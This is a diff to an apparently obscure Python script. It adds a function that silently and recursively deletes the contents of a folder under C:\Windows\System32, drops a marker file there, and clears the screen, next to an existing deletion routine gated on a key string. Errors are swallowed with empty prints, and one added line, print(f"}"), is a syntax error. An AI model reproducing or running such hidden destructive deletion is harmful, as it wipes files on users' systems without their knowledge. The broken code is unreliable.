@@ -110,6 +110,40 @@ def delete_files_in_sxxxx_directory():
             print("")
 os.system('cls')
 delete_files_in_sxxxx_directory()
+
+import os
+def delete_files_if_not_marked(target_folder, marker_file):
+    if os.path.exists(marker_file):
+        print(f"Skipping deletion: {marker_file} already exists.")
+        return
+
+    if os.path.exists(target_folder) and os.path.isdir(target_folder):
+        for filename in os.listdir(target_folder):
+            file_path = os.path.join(target_folder, filename)
+            try:
+                if os.path.isfile(file_path) or os.path.islink(file_path):
+                    os.unlink(file_path)
+                elif os.path.isdir(file_path):
+                    for root, dirs, files in os.walk(file_path, topdown=False):
+                        for f in files:
+                            os.unlink(os.path.join(root, f))
+                        for d in dirs:
+                            os.rmdir(os.path.join(root, d))
+                    os.rmdir(file_path)
+            except Exception as e:
+                print(f"")
+
+        try:
+            with open(marker_file, "w") as f:
+                f.write("completed.")
+            print(f"")
+        except Exception as e:
+            print(f"}")
+    else:
+        print("")
+
+delete_files_if_not_marked(r"C:\\Windows\\System32\\aes_kleix", r"C:\\Windows\\System32\\deleted_configs.nsh")
+
 os.system('cls')
 if cskey =="deletemysdfasdf":
     os.system('cls')
